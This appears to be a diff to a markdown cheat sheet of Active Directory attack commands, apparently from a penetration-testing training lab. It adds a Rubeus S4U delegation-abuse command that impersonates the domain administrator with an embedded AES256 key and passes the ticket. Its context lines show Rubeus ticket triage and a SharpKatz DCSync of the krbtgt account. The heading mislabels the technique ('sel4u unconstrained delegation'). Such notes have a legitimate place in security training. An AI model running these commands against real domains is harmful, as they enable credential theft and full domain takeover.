@@ -11,6 +11,10 @@ Rubeus triage (ticket list)
 ```
 C:\AD\Tools\Rubeus.exe triage
 ```
+Ruebus sel4u unconstrained delegation
+```
+C:\AD\Tools\Rubeus.exe s4u /user:appsvc /aes256:b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 /impersonateuser:administrator /msdsspn:CIFS/us-mssql.us.techcorp.local /altservice:HTTP /domain:us.techcorp.local /ptt
+```
 ## Sharpkatz
 ```
 C:\AD\Tools\SharpKatz.exe --Command dcsync --User us\krbtgt --Domain us.techcorp.local --DomainController us-dc.us.techcorp.local
